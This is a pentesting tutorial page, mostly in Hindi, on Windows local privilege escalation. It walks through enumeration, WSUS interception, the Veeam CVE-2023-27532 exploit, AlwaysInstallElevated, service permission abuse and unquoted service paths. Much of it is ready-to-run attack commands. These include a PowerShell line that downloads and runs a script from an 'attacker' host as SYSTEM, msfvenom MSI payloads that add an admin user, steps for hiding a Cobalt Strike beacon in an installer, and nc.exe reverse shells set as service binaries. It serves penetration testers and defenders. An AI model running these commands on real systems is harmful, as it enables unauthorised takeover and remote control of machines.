# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### Access Tokens

**यदि आप नहीं जानते कि Windows Access Tokens क्या हैं, तो जारी रखने से पहले निम्नलिखित पृष्ठ पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए निम्नलिखित पृष्ठ देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**यदि आप नहीं जानते कि Windows में integrity levels क्या हैं, तो जारी रखने से पहले निम्नलिखित पृष्ठ पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows में कई ऐसी चीज़ें हैं जो आपको सिस्टम को **enumerating करने से रोक सकती हैं**, निष्पादन योग्य फ़ाइलें चलाने से रोक सकती हैं या यहाँ तक कि आपकी गतिविधियों का **पता लगा सकती हैं**। आपको privilege escalation enumeration शुरू करने से पहले निम्नलिखित **पृष्ठ** को **पढ़कर** इन सभी **रक्षा** **तंत्रों** को **सूचीबद्ध** करना चाहिए:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

RAiLaunchAdminProcess के माध्यम से लॉन्च किए गए UIAccess processes का दुरुपयोग AppInfo secure-path checks bypass होने पर बिना प्रॉम्प्ट के High IL तक पहुँचने के लिए किया जा सकता है। समर्पित UIAccess/Admin Protection bypass workflow यहाँ देखें:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

## System Info

### Version info enumeration

जाँचें कि Windows संस्करण किसी ज्ञात भेद्यता से प्रभावित तो नहीं है (लागू किए गए पैच भी जाँचें)।
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

यह [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft security vulnerabilities के बारे में विस्तृत जानकारी खोजने के लिए उपयोगी है। यह डेटाबेस 4,700 से अधिक security vulnerabilities पर जानकारी रखता है, जो Windows environment द्वारा प्रस्तुत **massive attack surface** को दर्शाता है।

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

क्या कोई credential/Juicy info env variables में सहेजी गई है?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell इतिहास
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript फ़ाइलें

आप यह कैसे चालू करें, यह आप [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) पर सीख सकते हैं
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell पाइपलाइन के निष्पादनों का विवरण रिकॉर्ड किया जाता है, जिसमें निष्पादित commands, command invocations और स्क्रिप्ट के हिस्से शामिल हैं। हालाँकि, पूर्ण निष्पादन विवरण और आउटपुट परिणाम हमेशा कैप्चर नहीं किए जा सकते।

इसे सक्षम करने के लिए, documentation के "Transcript files" सेक्शन में दिए निर्देशों का पालन करें, और **"Module Logging"** चुनें न कि **"Powershell Transcription"**।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell लॉग्स के अंतिम 15 इवेंट देखने के लिए आप निम्नलिखित चला सकते हैं:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

स्क्रिप्ट के निष्पादन की संपूर्ण गतिविधि और पूरा सामग्री रिकॉर्ड कैप्चर किया जाता है, जिससे यह सुनिश्चित होता है कि कोड का हर ब्लॉक चलते समय दस्तावेजीकृत हो। यह प्रक्रिया प्रत्येक गतिविधि का एक व्यापक ऑडिट ट्रेल संरक्षित करती है, जो forensics और malicious behavior के विश्लेषण के लिए मूल्यवान है। क्रियान्वयन के समय सभी गतिविधियों का दस्तावेजीकरण करके, प्रक्रिया के बारे में विस्तृत अंतर्दृष्टि प्रदान की जाती है।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block के लॉगिंग इवेंट्स Windows Event Viewer में निम्न पथ पर पाए जा सकते हैं: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\  
पिछले 20 इवेंट देखने के लिए आप उपयोग कर सकते हैं:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### इंटरनेट सेटिंग्स
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ड्राइव्स
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

यदि अपडेट्स http**S** की बजाय http के माध्यम से अनुरोध किए जाते हैं, तो आप सिस्टम को compromise कर सकते हैं।

आप यह जाँच करके शुरू करते हैं कि नेटवर्क non-SSL WSUS update का उपयोग कर रहा है या नहीं, निम्नलिखित cmd में चलाकर:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
या PowerShell में निम्नलिखित:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
यदि आपको इनमें से किसी एक जैसा उत्तर मिलता है:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

तो, **it is exploitable.** यदि आख़िरी registry का मान 0 के बराबर है, तो WSUS entry को अनदेखा कर दिया जाएगा।

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
सारतः, यह वह कमज़ोरी है जिसका यह बग शोषण करता है:

> यदि हमारे पास अपने स्थानीय उपयोगकर्ता proxy को संशोधित करने की क्षमता है, और Windows Updates Internet Explorer की settings में configured proxy का उपयोग करता है, तो हम लोकली [PyWSUS](https://github.com/GoSecure/pywsus) चलाकर अपनी खुद की traffic को intercept कर सकते हैं और अपने asset पर elevated user के रूप में code चला सकते हैं।
>
> इसके अलावा, चूंकि WSUS service वर्तमान उपयोगकर्ता की settings का उपयोग करता है, यह उसके certificate store का भी उपयोग करेगा। यदि हम WSUS hostname के लिए एक self-signed certificate generate करें और इस certificate को वर्तमान उपयोगकर्ता के certificate store में जोड़ दें, तो हम HTTP और HTTPS दोनों WSUS traffic को intercept कर पाएँगे। WSUS किसी HSTS-like mechanisms का उपयोग नहीं करता जो certificate पर trust-on-first-use प्रकार की validation को लागू करे। यदि प्रस्तुत किया गया certificate user द्वारा trusted है और सही hostname है, तो service इसे स्वीकार कर लेगा।

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.

- **Recon**: listener और version confirm करें, उदाहरण के लिए `netstat -ano | findstr 9401` और `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`।
- **Exploit**: एक PoC रखें जैसे `VeeamHax.exe` आवश्यक Veeam DLLs के साथ उसी directory में रखें, फिर local socket पर SYSTEM payload trigger करें:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
The service executes the command as SYSTEM.
## KrbRelayUp

Windows **domain** environments में विशिष्ट परिस्थितियों के तहत एक **local privilege escalation** vulnerability मौजूद है। इनमें ऐसी environments शामिल हैं जहाँ **LDAP signing is not enforced,** users के पास self-rights हैं जो उन्हें **Resource-Based Constrained Delegation (RBCD)** configure करने की अनुमति देते हैं, और domain के भीतर users के लिए computers बनाने की क्षमता होती है। ध्यान दें कि ये **requirements** **default settings** के साथ भी मिलती हैं।

exploit को यहाँ देखें: [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

attack के flow के बारे में अधिक जानकारी के लिए इस लिंक को देखें: [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** ये 2 रजिस्ट्री कीज़ **enabled** हैं (value is **0x1**), तो किसी भी privilege वाले users `*.msi` फाइलें NT AUTHORITY\\**SYSTEM** के रूप में **install** (execute) कर सकते हैं।
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
यदि आपके पास एक meterpreter session है तो आप इस तकनीक को मॉड्यूल **`exploit/windows/local/always_install_elevated`** का उपयोग करके स्वचालित कर सकते हैं।

### PowerUP

Power-up के `Write-UserAddMSI` कमांड का उपयोग करके वर्तमान निर्देशिका में उच्चाधिकार प्राप्त करने के लिए एक Windows MSI बाइनरी बनाएं। यह स्क्रिप्ट एक precompiled MSI इंस्टॉलर लिखती है जो user/group जोड़ने के लिए prompt करता है (इसलिए आपको GIU access की आवश्यकता होगी):
```
Write-UserAddMSI
```
सिर्फ़ बनाए गए binary को चलाएँ ताकि आप escalate privileges कर सकें।

### MSI Wrapper

Read this tutorial to learn how to create a MSI wrapper using this tools. Note that you can wrap a "**.bat**" file if you **just** want to **execute** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike या Metasploit का उपयोग करके `C:\privesc\beacon.exe` में एक **नया Windows EXE TCP payload** जनरेट करें।
- **Visual Studio** खोलें, **Create a new project** चुनें और search box में "installer" टाइप करें। **Setup Wizard** प्रोजेक्ट चुनें और **Next** पर क्लिक करें।
- प्रोजेक्ट को एक नाम दें, जैसे **AlwaysPrivesc**, location के लिए **`C:\privesc`** का उपयोग करें, **place solution and project in the same directory** चुनें, और **Create** पर क्लिक करें।
- **Next** पर क्लिक करते रहें जब तक कि आप step 3 of 4 (choose files to include) तक न पहुँच जाएँ। **Add** पर क्लिक करें और वह Beacon payload चुनें जो आपने अभी जनरेट किया था। फिर **Finish** पर क्लिक करें।
- **Solution Explorer** में **AlwaysPrivesc** प्रोजेक्ट को हाइलाइट करें और **Properties** में **TargetPlatform** को **x86** से **x64** में बदलें।
- आप अन्य properties भी बदल सकते हैं, जैसे **Author** और **Manufacturer**, जो installed app को अधिक legitimate दिखा सकते हैं।
- प्रोजेक्ट पर right-click करें और **View > Custom Actions** चुनें।
- **Install** पर right-click करें और **Add Custom Action** चुनें।
- **Application Folder** पर double-click करें, अपनी **beacon.exe** फ़ाइल चुनें और **OK** पर क्लिक करें। इससे सुनिश्चित होगा कि installer चलने पर तभी beacon payload execute हो जाएगा।
- **Custom Action Properties** के तहत, **Run64Bit** को **True** पर बदलें।
- अंत में, **build it**।
- यदि यह warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखे, तो सुनिश्चित करें कि आपने platform को x64 पर सेट किया है।

### MSI Installation

बैकग्राउंड में malicious `.msi` फ़ाइल की **installation** को execute करने के लिए:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
To exploit this vulnerability you can use: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

ये सेटिंग्स यह तय करती हैं कि क्या **logged** किया जा रहा है, इसलिए आपको ध्यान देना चाहिए
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, यह जानना दिलचस्प है कि logs कहाँ भेजे जाते हैं
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** स्थानीय Administrator पासवर्ड्स के प्रबंधन के लिए डिज़ाइन किया गया है, यह सुनिश्चित करते हुए कि प्रत्येक पासवर्ड अद्वितीय, यादृच्छिक और डोमेन से जुड़े कंप्यूटरों पर नियमित रूप से अपडेट होता रहे। ये पासवर्ड Active Directory के भीतर सुरक्षित रूप से संग्रहीत होते हैं और केवल उन उपयोगकर्ताओं द्वारा एक्सेस किए जा सकते हैं जिन्हें ACLs के माध्यम से पर्याप्त अनुमति दी गई हो, जिससे वे अधिकृत होने पर स्थानीय admin पासवर्ड देख सकें।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

यदि सक्रिय है, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**WDigest के बारे में अधिक जानकारी इस पृष्ठ पर**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** से शुरू होकर, Microsoft ने Local Security Authority (LSA) के लिए सुरक्षा बढ़ाई ताकि अनट्रस्टेड प्रक्रियाओं द्वारा **read its memory** या inject code के प्रयासों को **block** किया जा सके, और सिस्टम और अधिक सुरक्षित हो सके।\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** को **Windows 10** में पेश किया गया था। इसका उद्देश्य डिवाइस पर संग्रहीत credentials को pass-the-hash attacks जैसे खतरों से सुरक्षित रखना है।| [**Credentials Guard के बारे में अधिक जानकारी यहाँ।**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** को **Local Security Authority** (LSA) द्वारा प्रमाणित किया जाता है और ऑपरेटिंग सिस्टम घटकों द्वारा उपयोग किया जाता है। जब किसी उपयोगकर्ता के logon डेटा को किसी registered security package द्वारा प्रमाणित किया जाता है, तो आम तौर पर उस उपयोगकर्ता के लिए domain credentials स्थापित किए जाते हैं।\
[**Cached Credentials के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## उपयोगकर्ता और समूह

### उपयोगकर्ताओं और समूहों को सूचीबद्ध करें

आपको यह जांचना चाहिए कि जिन समूहों के आप सदस्य हैं, क्या उनमें से किसी के पास रोचक permissions हैं।
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### विशेषाधिकार समूह

यदि आप **किसी विशेषाधिकार समूह के सदस्य हैं तो आप विशेषाधिकार बढ़ा सकते हैं**। यहाँ जानें कि विशेषाधिकार समूह क्या हैं और उन्हें दुरुपयोग करके विशेषाधिकार कैसे बढ़ाए जाएँ:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**और अधिक जानें** कि इस पृष्ठ पर एक **token** क्या है: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
निम्न पृष्ठ देखें ताकि आप **दिलचस्प tokens के बारे में जानें** और उन्हें दुरुपयोग कैसे किया जा सकता है:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### लॉग किए गए उपयोगकर्ता / सत्र
```bash
qwinsta
klist sessions
```
### होम फ़ोल्डर्स
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### पासवर्ड नीति
```bash
net accounts
```
### क्लिपबोर्ड की सामग्री प्राप्त करें
```bash
powershell -command "Get-Clipboard"
```
## चल रहे प्रोसेस

### फ़ाइल और फ़ोल्डर अनुमतियाँ

सबसे पहले, प्रक्रियाओं को सूचीबद्ध करते समय **प्रक्रिया की कमांड लाइन के अंदर पासवर्ड की जाँच करें**.\
जाँचें कि क्या आप **किसी चल रहे बाइनरी को overwrite कर सकते हैं** या क्या आपके पास बाइनरी फ़ोल्डर की write permissions हैं ताकि संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) का शोषण किया जा सके:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
हमेशा संभावित [**electron/cef/chromium debuggers** चल रहे हैं, आप इसका दुरुपयोग करके escalate privileges कर सकते हैं](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**processes binaries के permissions की जाँच**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**प्रोसेस बाइनरीज़ के फ़ोल्डरों की permissions की जाँच (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

आप sysinternals के **procdump** का उपयोग करके चल रही प्रक्रिया का memory dump बना सकते हैं। FTP जैसी सेवाओं की मेमोरी में **credentials in clear text in memory** होते हैं; मेमोरी को dump करके उन्हें पढ़ने की कोशिश करें।
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### असुरक्षित GUI एप्लिकेशन

**SYSTEM के रूप में चल रही Applications उपयोगकर्ता को CMD खोलने या डायरेक्टरी ब्राउज़ करने की अनुमति दे सकती हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), "command prompt" खोजें, "Click to open Command Prompt" पर क्लिक करें

## सेवाएँ

Service Triggers Windows को कुछ शर्तों के पूरा होने पर एक service शुरू करने देते हैं (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, आदि)। SERVICE_START rights के बिना भी आप अक्सर privileged services को उनके triggers फायर करके शुरू कर सकते हैं। enumeration और activation techniques यहाँ देखें:

-
{{#ref}}
service-triggers.md
{{#endref}}

services की सूची प्राप्त करें:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### अनुमतियाँ

आप किसी सेवा की जानकारी प्राप्त करने के लिए **sc** का उपयोग कर सकते हैं
```bash
sc qc <service_name>
```
प्रत्येक सेवा के लिए आवश्यक privilege level जांचने के लिए _Sysinternals_ का binary **accesschk** रखना अनुशंसित है।
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
यह सलाह दी जाती है कि जाँच करें कि "Authenticated Users" किसी भी सेवा को संशोधित कर सकते हैं:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[आप XP के लिए accesschk.exe यहाँ से डाउनलोड कर सकते हैं](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सर्विस सक्षम करें

यदि आपको यह त्रुटि मिल रही है (उदाहरण के लिए SSDPSRV के साथ):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

आप इसे निम्न का उपयोग करके सक्षम कर सकते हैं
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ध्यान रखें कि सेवा upnphost काम करने के लिए SSDPSRV पर निर्भर करती है (XP SP1 के लिए)**

**इस समस्या के लिए चलाने का एक और विकल्प है:**
```
sc.exe config usosvc start= auto
```
### **सर्विस बाइनरी पाथ संशोधित करें**

उस परिदृश्य में जहाँ "Authenticated users" समूह के पास किसी service पर **SERVICE_ALL_ACCESS** है, उस service के executable binary को संशोधित करना संभव है। **sc** को संशोधित और चलाने के लिए:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### सेवा पुनःप्रारंभ करें
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
विभिन्न अनुमतियों के माध्यम से अधिकार बढ़ाए जा सकते हैं:

- **SERVICE_CHANGE_CONFIG**: सर्विस बाइनरी को री-कन्फ़िगर करने की अनुमति देता है।
- **WRITE_DAC**: अनुमतियाँ पुन: कॉन्फ़िगर करने में सक्षम बनाता है, जिससे service configurations बदलने की क्षमता मिलती है।
- **WRITE_OWNER**: स्वामित्व प्राप्त करने और अनुमतियाँ पुन: कॉन्फ़िगर करने की अनुमति देता है।
- **GENERIC_WRITE**: service configurations बदलने की क्षमता प्रदान करता है।
- **GENERIC_ALL**: भी service configurations बदलने की क्षमता प्रदान करता है।

इस vulnerability का पता लगाने और exploit करने के लिए, _exploit/windows/local/service_permissions_ का उपयोग किया जा सकता है।

### Services binaries weak permissions

**जाँचें कि क्या आप उस बाइनरी को संशोधित कर सकते हैं जिसे कोई सर्विस execute करती है** या क्या आपके पास **उस फ़ोल्डर पर लिखने की अनुमति** है जहाँ बाइनरी स्थित है ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
आप wmic का उपयोग करके किसी सर्विस द्वारा execute की जाने वाली हर बाइनरी प्राप्त कर सकते हैं (not in system32) और icacls का उपयोग कर अपनी अनुमतियाँ जाँच सकते हैं:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
आप **sc** और **icacls** का भी उपयोग कर सकते हैं:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### सर्विस रजिस्ट्री को संशोधित करने की अनुमतियाँ

आपको जांचना चाहिए कि क्या आप किसी भी सर्विस रजिस्ट्री को संशोधित कर सकते हैं.\\
आप **जाँच** सकते हैं अपनी **अनुमतियाँ** किसी सर्विस **रजिस्ट्री** पर, ऐसा करें:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
जांचना चाहिए कि **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` permissions हैं या नहीं। यदि हाँ, तो service द्वारा execute किया जाने वाला binary बदला जा सकता है।

Execute किए जाने वाले binary के Path को बदलने के लिए:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services रजिस्ट्री AppendData/AddSubdirectory अनुमतियाँ

यदि आपके पास किसी रजिस्ट्री पर यह अनुमति है तो इसका मतलब है कि **आप इस रजिस्ट्री से सब-रजिस्ट्री बना सकते हैं**। Windows services के मामले में यह **मनमाना कोड चलाने के लिए पर्याप्त है:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

यदि executable का path quotes में नहीं है, तो Windows हर space से पहले के ending को execute करने की कोशिश करेगा।

उदाहरण के लिए, path _C:\Program Files\Some Folder\Service.exe_ के लिए Windows निम्नलिखित को execute करने की कोशिश करेगा:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
बिल्ट-इन Windows सेवाओं से संबंधित नहीं होने वाले सभी unquoted service paths सूचीबद्ध करें:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
